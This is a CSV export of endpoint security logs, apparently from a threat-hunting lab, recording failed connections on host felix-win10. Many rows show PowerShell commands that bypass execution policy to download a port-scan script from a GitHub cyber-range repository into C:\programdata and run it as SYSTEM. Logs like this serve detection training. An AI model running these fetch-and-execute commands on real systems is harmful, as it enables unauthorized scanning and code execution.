network_time [UTC],process_time [UTC],DeviceName,ActionType,LocalIP,RemoteIP,FileName,AccountName,InitiatingProcessFileName,ProcessCommandLine
"4/4/2025, 4:42:35.913 PM","4/4/2025, 4:41:24.596 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1"
"4/4/2025, 4:42:35.913 PM","4/4/2025, 4:41:19.528 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script19.ps1"
"4/4/2025, 4:42:35.913 PM","4/4/2025, 4:41:19.896 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell  -ExecutionPolicy Unrestricted -File script19.ps1
"4/4/2025, 4:42:35.913 PM","4/4/2025, 4:41:34.697 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1"
"4/4/2025, 4:42:35.913 PM","4/4/2025, 4:41:25.833 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
"4/4/2025, 4:42:35.913 PM","4/4/2025, 4:41:34.724 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
"4/4/2025, 4:42:33.507 PM","4/4/2025, 4:41:19.528 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script19.ps1"
"4/4/2025, 4:42:33.507 PM","4/4/2025, 4:41:24.596 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1"
"4/4/2025, 4:42:33.507 PM","4/4/2025, 4:41:19.896 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell  -ExecutionPolicy Unrestricted -File script19.ps1
"4/4/2025, 4:42:33.507 PM","4/4/2025, 4:41:34.724 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
"4/4/2025, 4:42:33.507 PM","4/4/2025, 4:41:34.697 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1"
"4/4/2025, 4:42:33.507 PM","4/4/2025, 4:41:25.833 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
"4/4/2025, 4:42:31.363 PM","4/4/2025, 4:41:24.596 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1"
"4/4/2025, 4:42:31.363 PM","4/4/2025, 4:41:34.697 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1"
"4/4/2025, 4:42:31.363 PM","4/4/2025, 4:41:19.896 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell  -ExecutionPolicy Unrestricted -File script19.ps1
"4/4/2025, 4:42:31.363 PM","4/4/2025, 4:41:19.528 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script19.ps1"
"4/4/2025, 4:42:31.363 PM","4/4/2025, 4:41:25.833 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
"4/4/2025, 4:42:31.363 PM","4/4/2025, 4:41:34.724 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
"4/4/2025, 4:42:29.226 PM","4/4/2025, 4:41:24.596 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1"
"4/4/2025, 4:42:29.226 PM","4/4/2025, 4:41:25.833 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
"4/4/2025, 4:42:29.226 PM","4/4/2025, 4:41:34.697 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1"
"4/4/2025, 4:42:29.226 PM","4/4/2025, 4:41:34.724 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
"4/4/2025, 4:42:29.226 PM","4/4/2025, 4:41:19.528 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script19.ps1"
"4/4/2025, 4:42:29.226 PM","4/4/2025, 4:41:19.896 PM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell  -ExecutionPolicy Unrestricted -File script19.ps1
"4/4/2025, 4:40:56.707 AM","4/4/2025, 4:39:05.412 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1"
"4/4/2025, 4:40:56.707 AM","4/4/2025, 4:39:05.439 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
"4/4/2025, 4:40:56.707 AM","4/4/2025, 4:39:17.509 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1"
"4/4/2025, 4:40:56.707 AM","4/4/2025, 4:39:17.651 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
"4/4/2025, 4:40:54.565 AM","4/4/2025, 4:39:17.509 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1"
"4/4/2025, 4:40:54.565 AM","4/4/2025, 4:39:05.412 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1"
"4/4/2025, 4:40:54.565 AM","4/4/2025, 4:39:17.651 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
"4/4/2025, 4:40:54.565 AM","4/4/2025, 4:39:05.439 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
"4/4/2025, 4:40:52.404 AM","4/4/2025, 4:39:17.509 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1"
"4/4/2025, 4:40:52.404 AM","4/4/2025, 4:39:05.439 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
"4/4/2025, 4:40:52.404 AM","4/4/2025, 4:39:05.412 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1"
"4/4/2025, 4:40:52.404 AM","4/4/2025, 4:39:17.651 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
"4/4/2025, 4:40:31.274 AM","4/4/2025, 4:39:05.412 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1"
"4/4/2025, 4:40:31.274 AM","4/4/2025, 4:39:17.509 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1"
"4/4/2025, 4:40:31.274 AM","4/4/2025, 4:39:05.439 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
"4/4/2025, 4:40:31.274 AM","4/4/2025, 4:39:17.651 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
"4/4/2025, 4:40:29.105 AM","4/4/2025, 4:39:05.439 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
"4/4/2025, 4:40:29.105 AM","4/4/2025, 4:39:17.509 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1"
"4/4/2025, 4:40:29.105 AM","4/4/2025, 4:39:17.651 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
"4/4/2025, 4:40:29.105 AM","4/4/2025, 4:39:05.412 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1"
"4/4/2025, 4:40:26.916 AM","4/4/2025, 4:39:05.439 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
"4/4/2025, 4:40:26.916 AM","4/4/2025, 4:39:17.651 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
"4/4/2025, 4:40:26.916 AM","4/4/2025, 4:39:17.509 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1"
"4/4/2025, 4:40:26.916 AM","4/4/2025, 4:39:05.412 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1"
"4/4/2025, 4:40:24.767 AM","4/4/2025, 4:39:17.651 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
"4/4/2025, 4:40:24.767 AM","4/4/2025, 4:39:17.509 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1"
"4/4/2025, 4:40:24.767 AM","4/4/2025, 4:39:05.439 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
"4/4/2025, 4:40:24.767 AM","4/4/2025, 4:39:05.412 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1"
"4/4/2025, 4:40:22.642 AM","4/4/2025, 4:39:17.651 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
"4/4/2025, 4:40:22.642 AM","4/4/2025, 4:39:05.439 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
"4/4/2025, 4:40:22.642 AM","4/4/2025, 4:39:17.509 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1"
"4/4/2025, 4:40:22.642 AM","4/4/2025, 4:39:05.412 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1"
"4/4/2025, 4:40:20.494 AM","4/4/2025, 4:39:17.651 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
"4/4/2025, 4:40:20.494 AM","4/4/2025, 4:39:05.439 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
"4/4/2025, 4:40:20.494 AM","4/4/2025, 4:39:17.509 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1"
"4/4/2025, 4:40:20.494 AM","4/4/2025, 4:39:05.412 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,cmd.exe,system,powershell.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1"
"4/4/2025, 4:40:18.384 AM","4/4/2025, 4:39:05.439 AM",felix-win10,ConnectionFailed,10.0.0.121,REDACTED IP,powershell.exe,system,powershell.exe,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
